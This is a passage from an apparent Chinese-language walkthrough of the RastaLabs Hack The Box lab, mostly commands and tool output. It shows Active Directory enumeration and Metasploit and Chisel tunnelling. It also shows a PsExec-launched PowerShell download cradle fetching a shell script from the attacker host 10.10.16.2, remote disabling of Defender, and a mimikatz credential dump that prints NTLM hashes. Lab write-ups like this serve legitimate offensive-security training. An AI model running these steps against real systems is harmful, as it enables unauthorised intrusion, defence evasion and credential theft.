accountexpires                : NEVER
cn                            : WS02
whenchanged                   : 13/03/2026 03:08:14
instancetype                  : 4
usncreated                    : 24441
objectguid                    : 1524e6d2-b9c0-4b07-b582-661e6acc5107
operatingsystem               : Windows 10 Pro
operatingsystemversion        : 10.0 (19045)
ms-mcs-admpwdexpirationtime   : 134184496929539160
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 26/10/2017 21:25:32, 26/10/2017 21:25:13...}
serviceprincipalname          : {WSMAN/ws02, WSMAN/ws02.rastalabs.local, RestrictedKrbHost/WS02, HOST/WS02...}
lastlogon                     : 13/03/2026 19:37:58
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 15/10/2017 13:44:24
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499378
dnshostname                   : ws02.rastalabs.local

pwdlastset                    : 09/08/2021 11:41:06
logoncount                    : 1668
badpasswordtime               : 09/08/2022 15:20:29
distinguishedname             : CN=WS03,OU=WS03,OU=Workstations,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:07:57
name                          : WS03
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-1136
samaccountname                : WS03$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : WS03
whenchanged                   : 13/03/2026 03:08:16
instancetype                  : 4
usncreated                    : 24481
objectguid                    : 1676d06d-e2a7-4d01-9282-c6acc58109a6
operatingsystem               : Windows 10 Pro
operatingsystemversion        : 10.0 (19045)
ms-mcs-admpwdexpirationtime   : 134184496948374346
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 19/03/2020 21:50:28, 19/03/2020 21:50:14...}
serviceprincipalname          : {WSMAN/ws03, WSMAN/ws03.rastalabs.local, RestrictedKrbHost/WS03, HOST/WS03...}
lastlogon                     : 13/03/2026 19:37:59
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 15/10/2017 13:57:51
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499379
dnshostname                   : ws03.rastalabs.local

pwdlastset                    : 09/08/2021 11:41:18
logoncount                    : 1813
badpasswordtime               : 09/08/2022 15:22:35
distinguishedname             : CN=WS04,OU=WS04,OU=Workstations,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:07:56
name                          : WS04
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-1137
samaccountname                : WS04$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : WS04
whenchanged                   : 13/03/2026 03:08:10
instancetype                  : 4
usncreated                    : 24532
objectguid                    : 205c489c-eb5d-4666-9893-961c88846f62
operatingsystem               : Windows 10 Pro
operatingsystemversion        : 10.0 (19045)
ms-mcs-admpwdexpirationtime   : 134184496902731179
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 19/03/2020 21:50:06, 19/03/2020 21:49:51...}
serviceprincipalname          : {WSMAN/ws04, WSMAN/ws04.rastalabs.local, RestrictedKrbHost/WS04, HOST/WS04...}
lastlogon                     : 13/03/2026 19:29:51
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 15/10/2017 14:04:07
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499375
dnshostname                   : ws04.rastalabs.local

pwdlastset                    : 09/08/2021 11:41:22
logoncount                    : 1848
badpasswordtime               : 14/09/2022 12:57:17
distinguishedname             : CN=WS05,OU=WS05,OU=Workstations,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:07:58
name                          : WS05
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-1138
samaccountname                : WS05$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : WS05
whenchanged                   : 13/03/2026 03:08:28
instancetype                  : 4
usncreated                    : 24603
objectguid                    : 9084e841-3e69-42a7-9620-4217c480a37d
operatingsystem               : Windows 10 Pro
operatingsystemversion        : 10.0 (19045)
ms-mcs-admpwdexpirationtime   : 134184497066720270
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 15/11/2017 10:12:21, 15/11/2017 10:12:05...}
serviceprincipalname          : {TERMSRV/WS05, TERMSRV/ws05.rastalabs.local, WSMAN/ws05, WSMAN/ws05.rastalabs.local...}
lastlogon                     : 13/03/2026 19:44:36
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 15/10/2017 14:10:21
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499386
dnshostname                   : ws05.rastalabs.local

pwdlastset                    : 09/08/2021 11:42:51
logoncount                    : 984
badpasswordtime               : 03/06/2022 00:21:25
distinguishedname             : CN=SQL01,OU=SQL,OU=Member Servers,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:04:57
name                          : SQL01
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-1156
samaccountname                : SQL01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : SQL01
whenchanged                   : 13/03/2026 03:05:59
instancetype                  : 4
usncreated                    : 25627
objectguid                    : bff2c692-5d46-4716-b5c8-51ba3fee3c8b
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
ms-mcs-admpwdexpirationtime   : 134184495593178576
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 06:40:54...}
serviceprincipalname          : {WSMAN/sql01, WSMAN/sql01.rastalabs.local, TERMSRV/SQL01, 
                                TERMSRV/sql01.rastalabs.local...}
lastlogon                     : 13/03/2026 19:30:33
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 15/10/2017 15:49:36
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499285
dnshostname                   : sql01.rastalabs.local

pwdlastset                     : 13/03/2026 03:06:45
logoncount                     : 82
badpasswordtime                : 01/01/1601 00:00:00
msds-managedpasswordpreviousid : {1, 0, 0, 0...}
distinguishedname              : CN=MSSQLSERVER,CN=Managed Service Accounts,DC=rastalabs,DC=local
objectclass                    : {top, person, organizationalPerson, user...}
lastlogontimestamp             : 13/03/2026 03:06:45
name                           : MSSQLSERVER
objectsid                      : S-1-5-21-1396373213-2872852198-2033860859-1158
msds-groupmsamembership        : {1, 0, 4, 128...}
localpolicyflags               : 0
codepage                       : 0
samaccounttype                 : MACHINE_ACCOUNT
accountexpires                 : NEVER
cn                             : MSSQLSERVER
whenchanged                    : 13/03/2026 03:06:45
instancetype                   : 4
useraccountcontrol             : WORKSTATION_TRUST_ACCOUNT
objectguid                     : 8f319556-a0e2-4989-bf37-56286ff29d0a
msds-managedpasswordid         : {1, 0, 0, 0...}
samaccountname                 : MSSQLSERVER$
objectcategory                 : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rastalabs,DC=loca
                                 l
dscorepropagationdata          : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                 06:40:54...}
serviceprincipalname           : {MSSQLSvc/sql01.rastalabs.local:1433, MSSQLSvc/sql01.rastalabs.local}
usncreated                     : 31491
msds-managedpasswordinterval   : 30
lastlogon                      : 13/03/2026 03:06:45
badpwdcount                    : 0
msds-supportedencryptiontypes  : 28
whencreated                    : 17/10/2017 20:25:30
countrycode                    : 0
primarygroupid                 : 515
iscriticalsystemobject         : False
usnchanged                     : 1499321
lastlogoff                     : 01/01/1601 00:00:00
dnshostname                    : sql01.rastalabs.local

pwdlastset                    : 10/08/2021 08:49:11
logoncount                    : 1428
badpasswordtime               : 01/01/1601 00:00:00
distinguishedname             : CN=WS06,OU=WS06,OU=Workstations,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:07:55
name                          : WS06
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-2101
samaccountname                : WS06$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : WS06
whenchanged                   : 13/03/2026 03:08:12
instancetype                  : 4
usncreated                    : 279319
objectguid                    : c2c41fda-da35-41fa-8e5b-92fc18b3c28d
operatingsystem               : Windows 10 Pro
operatingsystemversion        : 10.0 (19045)
ms-mcs-admpwdexpirationtime   : 134184496898370928
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 19/03/2020 21:49:23, 19/03/2020 21:49:07...}
serviceprincipalname          : {WSMAN/ws06, WSMAN/ws06.rastalabs.local, RestrictedKrbHost/WS06, HOST/WS06...}
lastlogon                     : 13/03/2026 19:43:09
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 04/11/2019 11:26:14
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499376
dnshostname                   : ws06.rastalabs.local

pwdlastset                    : 09/08/2021 11:41:06
logoncount                    : 365
badpasswordtime               : 09/08/2022 15:40:45
distinguishedname             : CN=SRV01,OU=SRV,OU=Member Servers,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:06:02
name                          : SRV01
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-3101
samaccountname                : SRV01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : SRV01
whenchanged                   : 13/03/2026 03:06:11
instancetype                  : 4
usncreated                    : 447248
objectguid                    : 8cc67fd2-81c6-43be-b7f5-e545d7fd01c2
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
ms-mcs-admpwdexpirationtime   : 134184495698517738
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 06:40:54...}
serviceprincipalname          : {WSMAN/srv01, WSMAN/srv01.rastalabs.local, TERMSRV/SRV01, 
                                TERMSRV/srv01.rastalabs.local...}
lastlogon                     : 13/03/2026 19:31:50
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 19/03/2020 14:09:46
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499302
dnshostname                   : srv01.rastalabs.local

pwdlastset                    : 17/08/2021 09:44:14
logoncount                    : 403
badpasswordtime               : 01/01/1601 00:00:00
distinguishedname             : CN=SQL02,OU=SQL,OU=Member Servers,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:06:01
name                          : SQL02
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-4101
samaccountname                : SQL02$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : SQL02
whenchanged                   : 13/03/2026 03:06:13
instancetype                  : 4
usncreated                    : 1066021
objectguid                    : e50f3077-f8b0-4873-90f6-5ab72c8abe81
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
ms-mcs-admpwdexpirationtime   : 134184495743749516
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 06:40:54...}
serviceprincipalname          : {WSMAN/sql02, WSMAN/sql02.rastalabs.local, TERMSRV/SQL02, 
                                TERMSRV/sql02.rastalabs.local...}
lastlogon                     : 13/03/2026 19:31:50
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 03/08/2020 11:23:15
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499305
dnshostname                   : sql02.rastalabs.local

pwdlastset                     : 28/08/2021 07:13:15
logoncount                     : 13
badpasswordtime                : 01/01/1601 00:00:00
msds-managedpasswordpreviousid : {1, 0, 0, 0...}
distinguishedname              : CN=MSSQLSvc,CN=Managed Service Accounts,DC=rastalabs,DC=local
objectclass                    : {top, person, organizationalPerson, user...}
lastlogontimestamp             : 30/08/2021 08:26:00
name                           : MSSQLSvc
objectsid                      : S-1-5-21-1396373213-2872852198-2033860859-4102
msds-groupmsamembership        : {1, 0, 4, 128...}
localpolicyflags               : 0
codepage                       : 0
samaccounttype                 : MACHINE_ACCOUNT
accountexpires                 : NEVER
cn                             : MSSQLSvc
whenchanged                    : 01/09/2021 09:27:43
instancetype                   : 4
useraccountcontrol             : WORKSTATION_TRUST_ACCOUNT
objectguid                     : ca2dd2e1-98cc-4762-8cbf-bf10d5a63e96
msds-managedpasswordid         : {1, 0, 0, 0...}
samaccountname                 : MSSQLSvc$
objectcategory                 : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rastalabs,DC=loca
                                 l
dscorepropagationdata          : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                 06:40:54...}
usncreated                     : 1066072
msds-managedpasswordinterval   : 30
lastlogon                      : 01/09/2021 10:27:01
badpwdcount                    : 0
msds-supportedencryptiontypes  : 28
whencreated                    : 03/08/2020 11:27:53
countrycode                    : 0
primarygroupid                 : 515
iscriticalsystemobject         : False
usnchanged                     : 1204589
lastlogoff                     : 01/01/1601 00:00:00
dnshostname                    : sql02.rastalabs.local


```

### Find-DomainShare
**枚举共享  **

```plain
PS C:\Users\Public> Find-DomainShare

Name           Type Remark              ComputerName         
----           ---- ------              ------------         
ADMIN$   2147483648 Remote Admin        dc01.rastalabs.local 
C$       2147483648 Default share       dc01.rastalabs.local 
IPC$     2147483651 Remote IPC          dc01.rastalabs.local 
NETLOGON          0 Logon server share  dc01.rastalabs.local 
SYSVOL            0 Logon server share  dc01.rastalabs.local 
ADMIN$   2147483648 Remote Admin        fs01.rastalabs.local 
C$       2147483648 Default share       fs01.rastalabs.local 
finance           0                     fs01.rastalabs.local 
home$             0                     fs01.rastalabs.local 
IPC$     2147483651 Remote IPC          fs01.rastalabs.local 
ADMIN$   2147483648 Remote Admin        ws01.rastalabs.local 
C$       2147483648 Default share       ws01.rastalabs.local 
IPC$     2147483651 Remote IPC          ws01.rastalabs.local 
address           0                     mx01.rastalabs.local 
ADMIN$   2147483648 Remote Admin        mx01.rastalabs.local 
C$       2147483648 Default share       mx01.rastalabs.local 
IPC$     2147483651 Remote IPC          mx01.rastalabs.local 
ADMIN$   2147483648 Remote Admin        ws02.rastalabs.local 
C$       2147483648 Default share       ws02.rastalabs.local 
IPC$     2147483651 Remote IPC          ws02.rastalabs.local 
ADMIN$   2147483648 Remote Admin        ws03.rastalabs.local 
C$       2147483648 Default share       ws03.rastalabs.local 
IPC$     2147483651 Remote IPC          ws03.rastalabs.local 
ADMIN$   2147483648 Remote Admin        ws04.rastalabs.local 
C$       2147483648 Default share       ws04.rastalabs.local 
IPC$     2147483651 Remote IPC          ws04.rastalabs.local 
ADMIN$   2147483648 Remote Admin        ws05.rastalabs.local 
C$       2147483648 Default share       ws05.rastalabs.local 
IPC$     2147483651 Remote IPC          ws05.rastalabs.local 
ADMIN$   2147483648 Remote Admin        sql01.rastalabs.local
C$       2147483648 Default share       sql01.rastalabs.local
IPC$     2147483651 Remote IPC          sql01.rastalabs.local
ADMIN$   2147483648 Remote Admin        sql01.rastalabs.local
C$       2147483648 Default share       sql01.rastalabs.local
IPC$     2147483651 Remote IPC          sql01.rastalabs.local
ADMIN$   2147483648 Remote Admin        ws06.rastalabs.local 
C$       2147483648 Default share       ws06.rastalabs.local 
IPC$     2147483651 Remote IPC          ws06.rastalabs.local 
ADMIN$   2147483648 Remote Admin        srv01.rastalabs.local
C$       2147483648 Default share       srv01.rastalabs.local
IPC$     2147483651 Remote IPC          srv01.rastalabs.local
ADMIN$   2147483648 Remote Admin        sql02.rastalabs.local
C$       2147483648 Default share       sql02.rastalabs.local
IPC$     2147483651 Remote IPC          sql02.rastalabs.local
ADMIN$   2147483648 Remote Admin        sql02.rastalabs.local
C$       2147483648 Default share       sql02.rastalabs.local
IPC$     2147483651 Remote IPC          sql02.rastalabs.local
```

## Msf搭建隧道
### 查看网卡
```plain
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  6
============
Name         : vmxnet3 Ethernet Adapter
Hardware MAC : 00:50:56:94:d0:41
MTU          : 1500
IPv4 Address : 10.10.123.101
IPv4 Netmask : 255.255.254.0
IPv6 Address : fe80::1310:d86d:5b66:f96c
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

### 添加路由
在 meterpreter 里：

```plain
run autoroute -s 0.0.0.0/0
```

查看路由：

```plain
run autoroute -p
```

---

### 启动 SOCKS 隧道
把 session 丢后台：

```plain
background
```

启动 SOCKS：

```plain
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1081
run
```

这是 **Metasploit Framework** 的 SOCKS 代理模块

## Chisel搭建隧道
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# chisel server -p 80 --reverse
2026/03/14 20:47:18 server: Reverse tunnelling enabled
2026/03/14 20:47:18 server: Fingerprint 0re9OwQe9lQWX+CpjlaQFA/hUZvVx8zbzjJsMuDsb6I=
2026/03/14 20:47:18 server: Listening on http://0.0.0.0:80
2026/03/14 20:47:55 server: session#1: Client version (1.11.3) differs from server version (1.11.3-0kali1)
2026/03/14 20:47:55 server: session#1: tun: proxy#R:127.0.0.1:1234=>socks: Listening
```

```plain
upload /home/kali/Desktop/tools/chisel/chisel.exe C:\\Users\\Public\\chisel.exe
execute -f C:\\Users\\Public\\chisel.exe -a "client 10.10.16.2:80 R:socks"
```

# FS01-10.10.120.5-RLAB\bowen
## $RECYCLE.BIN
```plain
meterpreter > dir
Listing: \\fs01.rastalabs.local\home$\bowen\Desktop\$RECYCLE.BIN
================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  132   fil   2023-10-11 19:23:25 +0800  $IK0VB1H.txt
100666/rw-rw-rw-  469   fil   2023-10-11 19:24:08 +0800  $RK0VB1H.txt
100666/rw-rw-rw-  129   fil   2023-10-10 22:20:30 +0800  desktop.ini
```

## Download
```plain
meterpreter > download $IK0VB1H.txt
[*] Downloading: $IK0VB1H.txt -> /home/kali/Desktop/htb/rastalabs/$IK0VB1H.txt
[*] Downloaded 132.00 B of 132.00 B (100.0%): $IK0VB1H.txt -> /home/kali/Desktop/htb/rastalabs/$IK0VB1H.txt
[*] Completed  : $IK0VB1H.txt -> /home/kali/Desktop/htb/rastalabs/$IK0VB1H.txt

meterpreter > download $RK0VB1H.txt
[*] Downloading: $RK0VB1H.txt -> /home/kali/Desktop/htb/rastalabs/$RK0VB1H.txt
[*] Downloaded 469.00 B of 469.00 B (100.0%): $RK0VB1H.txt -> /home/kali/Desktop/htb/rastalabs/$RK0VB1H.txt
[*] Completed  : $RK0VB1H.txt -> /home/kali/Desktop/htb/rastalabs/$RK0VB1H.txt
```

# SRV01-10.10.120.15-RLAB\bowen
## 管理验证
```plain
Invoke-Command -ComputerName srv01.rastalabs.local -ScriptBlock {hostname}
srv01
```

## Session查询
```plain
Get-NetSession -ComputerName srv01
CName        : \\10.10.123.101
UserName     : bowen
Time         : 0
IdleTime     : 0
ComputerName : srv01
```

## IP获取
```plain
PS C:\Users\Public> ping srv01

Pinging srv01.rastalabs.local [10.10.120.15] with 32 bytes of data:
Reply from 10.10.120.15: bytes=32 time=1ms TTL=127
Reply from 10.10.120.15: bytes=32 time=1ms TTL=127
Reply from 10.10.120.15: bytes=32 time=1ms TTL=127
Reply from 10.10.120.15: bytes=32 time=1ms TTL=127

Ping statistics for 10.10.120.15:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 1ms, Maximum = 1ms, Average = 1ms
```

## 本机凭据
```plain
PS C:\Users\Public> cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=bowen
    Type: Generic 
    User: bowen
```

## 远程登录
由于cmdkey /list中存放了bowen凭据所以可以直接登录

```plain
PS C:\Users\Public> net use \\10.10.120.15
The command completed successfully.
```

## 反弹shell(失败)
```plain
meterpreter > upload /home/kali/Desktop/tools/Pstools/PsExec.exe C:\\Users\\Public\\PsExec.exe
[*] Uploading  : /home/kali/Desktop/tools/Pstools/PsExec.exe -> C:\Users\Public\PsExec.exe
[*] Uploaded 699.39 KiB of 699.39 KiB (100.0%): /home/kali/Desktop/tools/Pstools/PsExec.exe -> C:\Users\Public\PsExec.exe
[*] Completed  : /home/kali/Desktop/tools/Pstools/PsExec.exe -> C:\Users\Public\PsExec.exe
```

```plain
shell C:\Users\Public\PsExec.exe \\10.10.120.15 cmd /c "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:443/shell.ps1')"
```

失败了 尝试ping

```plain
meterpreter > execute -f C:\\Users\\Public\\PsExec.exe -a "\\\\10.10.120.15 cmd /c ping 10.10.16.2" -i
Process 3196 created.
Channel 12 created.

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Starting cmd on 10.10.120.15...on 10.10.120.15...

Pinging 10.10.16.2 cmd exited on 10.10.120.15 with error code 1.
```

无法回连

## 关闭Defender
```plain
execute -f C:\\Users\\Public\\PsExec.exe -a "\\\\10.10.120.15 powershell -ep bypass -nop -c Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true" -i
```

## mimikatz
### upload
```plain
meterpreter > upload /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe C:\\Users\\Public\\mimikatz.exe
[*] Uploading  : /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe -> C:\Users\Public\mimikatz.exe
[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe -> C:\Users\Public\mimikatz.exe
[*] Completed  : /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe -> C:\Users\Public\mimikatz.exe
```

```plain
PS C:\Users\Public> net use z: \\10.10.120.15\c$
The command completed successfully.
```

```plain
copy C:\Users\Public\mimikatz.exe z:\Users\Public
```

### sekurlsa::logonpasswords
```plain
execute -f C:\\Users\\Public\\PsExec.exe -a "\\\\10.10.120.15 -s cmd /c C:\\Users\\Public\\mimikatz.exe \"log C:\\Users\\Public\\out.txt\" \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
```

```plain
PS z:\Users\Public> type out.txt

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SRV01$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 13/03/2026 03:05:58
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SRV01$
         * Domain   : RLAB
         * NTLM     : ff6b0335cc1a85d404129df294ce45ab
         * SHA1     : ed2ce72ebd4780136cb03b548a7346a418bc33cd
        tspkg :
        wdigest :
         * Username : SRV01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : srv01$
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70602 (00000000:000113ca)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 13/03/2026 03:05:58
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SRV01$
         * Domain   : RLAB
         * NTLM     : ff6b0335cc1a85d404129df294ce45ab
         * SHA1     : ed2ce72ebd4780136cb03b548a7346a418bc33cd
        tspkg :
        wdigest :
         * Username : SRV01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : SRV01$
         * Domain   : rastalabs.local
         * Password : 4a e7 56 80 32 77 85 18 d8 57 e7 d9 ca 62 3d fa 7f ae d6 88 dc d3 46 97 e3 fc b6 4c 69 67 dd ab ce fd 8a 9d 84 d9 89 60 51 c0 49 0b 97 eb db a9 70 64 56 af 5e d4 7d f9 4c d4 7d 77 dc 2a 0d 17 28 22 91 53 f9 7f cd 4f 60 08 01 90 e3 77 95 b2 ac bb b9 d4 2b 3e 57 29 03 55 08 e1 7f 7a c7 fb 25 28 50 1f 76 00 25 5e 1f a9 21 75 75 00 28 f5 aa b2 78 20 f8 59 c9 ac 7d 28 7a ee f4 c2 cb a2 eb 29 93 37 17 9d 63 11 93 8e 73 f0 f1 7e 1f 58 41 34 99 e1 73 d2 17 1d 47 89 b7 0b 40 b3 8f 0b 54 02 bc 0a 2b 71 fa 20 8a de 03 fd b8 b9 6e 6f ce a6 91 3d f0 98 ab 49 e5 f0 5e 6e 52 67 6e b5 32 ee 1f 2f 69 77 23 1a f3 35 d1 b4 4e 17 4c 88 68 12 39 b6 ba ef a0 df 3b c1 62 81 7c 42 97 33 45 d7 83 a4 ae 8b 1a 8c 50 32 c9 b6 e6 fe aa 6e 
        ssp :
        credman :

Authentication Id : 0 ; 70566 (00000000:000113a6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 13/03/2026 03:05:58
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SRV01$
         * Domain   : RLAB
         * NTLM     : ff6b0335cc1a85d404129df294ce45ab
         * SHA1     : ed2ce72ebd4780136cb03b548a7346a418bc33cd
        tspkg :
        wdigest :
         * Username : SRV01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : SRV01$
         * Domain   : rastalabs.local
         * Password : 4a e7 56 80 32 77 85 18 d8 57 e7 d9 ca 62 3d fa 7f ae d6 88 dc d3 46 97 e3 fc b6 4c 69 67 dd ab ce fd 8a 9d 84 d9 89 60 51 c0 49 0b 97 eb db a9 70 64 56 af 5e d4 7d f9 4c d4 7d 77 dc 2a 0d 17 28 22 91 53 f9 7f cd 4f 60 08 01 90 e3 77 95 b2 ac bb b9 d4 2b 3e 57 29 03 55 08 e1 7f 7a c7 fb 25 28 50 1f 76 00 25 5e 1f a9 21 75 75 00 28 f5 aa b2 78 20 f8 59 c9 ac 7d 28 7a ee f4 c2 cb a2 eb 29 93 37 17 9d 63 11 93 8e 73 f0 f1 7e 1f 58 41 34 99 e1 73 d2 17 1d 47 89 b7 0b 40 b3 8f 0b 54 02 bc 0a 2b 71 fa 20 8a de 03 fd b8 b9 6e 6f ce a6 91 3d f0 98 ab 49 e5 f0 5e 6e 52 67 6e b5 32 ee 1f 2f 69 77 23 1a f3 35 d1 b4 4e 17 4c 88 68 12 39 b6 ba ef a0 df 3b c1 62 81 7c 42 97 33 45 d7 83 a4 ae 8b 1a 8c 50 32 c9 b6 e6 fe aa 6e 
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 13/03/2026 03:05:58
SID               : S-1-5-19
        msv :
        tspkg :
